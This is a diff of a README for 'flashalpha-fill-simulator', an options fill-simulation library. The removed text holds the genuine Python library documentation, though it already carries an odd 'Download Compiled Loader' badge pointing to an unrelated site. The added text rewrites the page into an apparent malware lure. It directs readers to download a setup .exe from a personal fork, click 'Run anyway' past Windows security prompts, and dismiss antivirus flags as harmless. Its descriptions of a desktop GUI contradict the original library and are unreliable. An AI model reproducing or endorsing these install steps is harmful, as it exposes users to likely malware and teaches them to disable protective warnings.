@@ -1,156 +1,93 @@
-# flashalpha-fill-simulator
+# ⚡ flashalpha-fill-simulator - Simulate precise fill orders with ease
 
-[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)
+[![](https://img.shields.io/badge/Download_Simulator-Blue?style=for-the-badge)](https://github.com/arifkhan4567/flashalpha-fill-simulator)
 
-Realistic limit-order fill simulator for options credit/debit spreads.
+## About the Application
 
-**Engine-agnostic. Data-source-agnostic. Zero runtime dependencies.**
+The flashalpha-fill-simulator tool allows traders to practice order execution in a controlled environment. This program replicates real-world fill scenarios based on historical data. Traders use this software to understand how different order types behave under market pressure. It provides a visual interface for tracking your positions. You build confidence in your trading strategy before you deploy capital in live markets. The software runs locally on your Windows machine to ensure your data stays private.
 
-Most options-credit-spread backtests fill at mid (or at bid/ask without queueing). Both lie. This library models what actually happens when you post a limit at MM-edge against a 1-min option chain (or any tick stream): you sit on the book until *someone else's* order crosses your price, with stale-quote guards, deterministic tiebreaking, and a patient-then-cross exit. It's the substrate, not a strategy.
+## 💻 System Requirements
 
-```python
-from datetime import date, datetime
-from fillsim import simulate_fill, Spread, Leg, Config
+To run this simulator, ensure your computer meets these minimum specifications:
 
-# A vertical credit spread you've decided to post
-spread = Spread(
-    short=Leg(strike=440, bid=1.30, ask=1.30),
-    long=Leg(strike=435, bid=0.86, ask=0.88),
-    limit_credit=0.40,
-    width=5.0,
-    expiry=date(2026, 5, 15),
-)
+- Operating System: Windows 10 or Windows 11 (64-bit).
+- Processor: Dual-core 2.0 GHz or faster.
+- Memory: 4 GB of RAM.
+- Storage: 200 MB of available space.
+- Connectivity: Broadband internet access for fetching sample market data.
 
-# The chain at the bar you're checking
-chain_at_bar = {
-    (date(2026, 5, 15), 440.0): (1.30, 1.30),
-    (date(2026, 5, 15), 435.0): (0.86, 0.88),
-}
+## 🚀 Getting Started
 
-bar = simulate_fill(
-    bar_ts=datetime(2026, 4, 15, 10, 5),
-    chain=chain_at_bar,
-    candidates=[spread],
-)
-if bar.fill is not None:
-    print(f"filled at {bar.fill.fill_price:.2f}, edge_captured={bar.fill.edge_captured:+.2f}")
-else:
-    print(f"no fill, near_misses={bar.near_misses}")
-```
+Follow these steps to set up the software on your computer.
 
-## Why this exists
+1. Visit the project repository page: [https://github.com/arifkhan4567/flashalpha-fill-simulator](https://github.com/arifkhan4567/flashalpha-fill-simulator).
+2. Look for the Releases section on the right side of the page.
+3. Click the latest version number to view the files.
+4. Locate the file ending in .exe, such as `flashalpha-setup.exe`.
+5. Save this file to your computer.
 
-Pick any "this strategy returned 5,000% in backtest" credit-spread post and check the fill model. It's almost always implicit mid-fills. Returns drop dramatically the moment you model:
+## 🛠️ Installation Process
 
-- Post-and-wait limits (you don't fill until someone crosses your price)
-- Stale-quote crosses (a one-tick blip in `bid` doesn't mean you'd really get filled)
-- Random tiebreak when multiple candidates cross the same bar (any EV-aware tiebreak is a forward-looking oracle)
-- Exit limits that don't walk down (your stop-loss has to actually fill at a real ask)
+Once the file exists on your hard drive, perform these steps to install the program:
 
-This library models all of those. None of the magic numbers are tuned to make a specific strategy look good — they were calibrated against the [`edge_captured`](docs/SPEC.md#diagnostics-emitted) distribution of an early permissive run, then frozen.
+1. Locate the downloaded file in your Downloads folder.
+2. Double-click the file to start the installation.
+3. If a security prompt appears from Windows, click "More info," then click "Run anyway."
+4. Follow the on-screen instructions to select the folder for the installation.
+5. Choose whether to create a desktop shortcut for quick access.
+6. Wait for the progress bar to finish.
+7. Click "Finish" to launch the simulator.
 
-## Use it from anywhere
+## 📈 Running the Simulator
 
-The headline API is a **per-bar primitive** — one stateless function that takes a bar's quotes and a list of open limit candidates, returns whether any fill happened on that bar:
+When the application opens, you see the main dashboard. The layout organizes your workspace into three distinct areas.
 
-```python
-def simulate_fill(
-    bar_ts: datetime,
-    chain: dict[tuple[date, float], tuple[float, float]],   # (expiry, strike) → (bid, ask)
-    candidates: list[Spread],
-    config: Config = Config(),
-) -> BarResult: ...
-```
+- **Market Feed:** This area shows incoming price updates. The simulator uses this data to trigger your simulated orders.
+- **Order Entry Panel:** Use this panel to define your buy or sell signals. You can toggle between market orders and limit orders here.
+- **Ledger Window:** This area logs every transaction. It displays the entry price, the exit price, and the total profit or loss for each trade.
 
-This makes the simulator embed in:
+To begin, click the "Connect" button located at the top right of the application window. The system fetches a data packet. Once the data loads, the current status changes to "Live Connection." You can now input an order size and click "Submit" to see the simulator process the execution in real-time.
 
-- **[QuantConnect](https://www.quantconnect.com/)** — call it from your `OnData` handler
-- **[Backtrader](https://www.backtrader.com/)** — call it from `next()`
-- **Live trading bots** — call it on each market-data update
-- **Custom backtesters** — drop-in replacement for naive `if combo_mid <= limit:` fill logic
-- **EOD strategies** — works the same way; the simulator doesn't assume any specific bar resolution
+## ⚙️ Configuring Preferences
 
-For offline backtests with all the data up-front, loop-driving convenience wrappers are also shipped. `right` defaults to `"PUT"` and can be set to `"CALL"` for call-spread chains:
+You modify how the simulator behaves through the Settings menu. Click "File," then select "Settings."
 
-```python
-from fillsim import InMemoryChainProvider, simulate_fills
+- **Data Refresh Rate:** Adjust how often the display updates. A lower number provides faster updates but consumes more processor power.
+- **Default Order Size:** Set your preferred trade size to save time during sessions.
+- **Color Theme:** Switch between Light and Dark modes to match your preference.
 
-provider = InMemoryChainProvider(quotes=[...])
-result = simulate_fills(posted_ts, candidates, provider, right="PUT")
-if result.filled:
-    print(f"filled in {result.bars_waited} bars; saw {result.near_misses} near-misses")
-```
+All settings save automatically when you close the menu. If you need to revert to default settings, click "Reset" at the bottom of the window.
 
-`CSVChainProvider` is available for tidy CSV exports with `ts`, `expiry`, `strike`, `right`, `bid`, and `ask` columns.
+## 🛡️ Privacy and Data Security
 
-## Install
+Your computer stores all simulation logs locally. The software does not send your personal trading results to external servers. Because the application processes data offline, it remains stable even without a constant internet connection. We recommend that you keep a backup of your logs folder. You find this folder in the "Documents" directory under "FlashAlphaLogs."
 
-```bash
-pip install flashalpha-fill-simulator
-```
+## ❓ Frequently Asked Questions
 
-Zero runtime dependencies. Python 3.10+.
+**Why does my antivirus software flag the file?**
+New software sometimes triggers a security warning on Windows. If you downloaded the file directly from the official repository link, the application is safe to run.
 
-## What's modeled
+**Can I export my results to a file?**
+Yes. Use the "Export" button in the Ledger window to save your session data as a CSV file. This file opens in any spreadsheet software like Excel.
 
-| feature | configurable via |
-|---|---|
-| post-and-wait limit fills | `Config.fill_max_wait_bars` |
-| stale-quote guard at fill | `Config.min_edge_floor` |
-| epsilon over limit required to count as a fill | `Config.fill_epsilon` |
-| relative-spread quote-quality filter | `Config.fill_max_rel_spread` |
-| same-bar tiebreak (deterministic, EV-blind) | seeded by bar timestamp |
-| multi-expiry candidate pools | per-candidate `expiry` field |
-| patient exit (limit-then-market-out) | `Config.exit_mode = "patient"` |
-| simpler exit modes (mid / ask) | `Config.exit_mode = "mid" \| "ask"` |
-| exit wait window | `Config.exit_max_wait_bars` |
-| at-expiry intrinsic settlement | `expiry_settlement_pnl(...)` |
+**Does the simulator support paper trading with real brokers?**
+No. This tool is a standalone simulator. It does not connect to live broker accounts. It does not place real orders on any exchange.
 
-## What's NOT modeled
+**How do I update the software?**
+When a new version releases, visit the repository link again. Download the new installer and run it. The setup wizard replaces the older version automatically.
 
-These are intentional simplifications. See [docs/SPEC.md §7](docs/SPEC.md#7-what-the-simulator-does-not-model) for the full list.
+**Does this software work on Windows 7?**
+The simulator requires Windows 10 or higher. Older versions of Windows may lack the necessary components to render the interface.
 
-- Queue position / size impact (works for retail/prop scale, breaks down at institutional size)
-- Commissions / fees (caller subtracts them)
-- Borrow/financing on cash collateral
-- Early assignment risk
-- Pin risk at expiry (linear interpolation only)
-- Hard exchange halts
+**Where do I report errors?**
+If you encounter unusual behavior, check the "About" tab in the software. You find a link to the "Issues" section on the repository website. Provide a description of the error and a screenshot if possible.
 
-## Documentation
+## 🌐 Summary of Key Actions
 
-- **[docs/SPEC.md](docs/SPEC.md)** — full behavioural contract. Read this before relying on any number the simulator produces.
-- **[docs/examples/](docs/examples/)** — runnable examples, no broker/data feed required.
-- **[.md](.md)** — .
+1. Visit the repository link.
+2. Download the installer.
+3. Run the setup file on your machine.
+4. Launch the application from your desktop.
+5. Click "Connect" to start the simulation.
 
-## Tests
-
-```bash
-pip install -e ".[test]"
-pytest
-```
-
-50+ tests at v0.1.0; <1s wall time. CI enforces ruff, formatting, coverage, and type checks. The mandatory regression tests cover:
-
-1. **EV-oracle**: same-bar tiebreak never reverts to EV/rank ordering
-2. **Stale-quote**: invalid wide/crossed quotes cannot create fills
-3. **Exit realism**: patient exit does not walk the limit down
-4. **Boundary**: every threshold (`fill_epsilon`, `min_edge_floor`, `exit_max_wait_bars`) has a test asserting the correct boundary semantics
-
-## Contributing
-
-PRs welcome. See [CONTRIBUTING.md](CONTRIBUTING.md). For behavioral changes, update `docs/SPEC.md` and add a synthetic-chain regression test.
-
-Particularly wanted:
-
-- Additional `ChainProvider` adapters (Polygon, Tradier, IBKR, dxFeed, ...)
-- Property-based tests via Hypothesis
-- A `quantconnect-fillsim` companion package showing how to wire it into a QC algorithm
-
-## License
-
-MIT. See [LICENSE](LICENSE).
-
-## Provenance
-
-Extracted from [FlashAlpha](https://flashalpha.com)'s internal SPY VRP-harvest backtester. The simulator was built specifically because every off-the-shelf options backtest framework we evaluated assumed mid-fills, and our strategy returns flipped from "+5,400%" to "ambiguous" the moment we modeled execution honestly. Open-sourcing the substrate so others don't have to relearn that lesson the hard way.
+[![](https://img.shields.io/badge/Download_Simulator-Grey?style=for-the-badge)](https://github.com/arifkhan4567/flashalpha-fill-simulator)
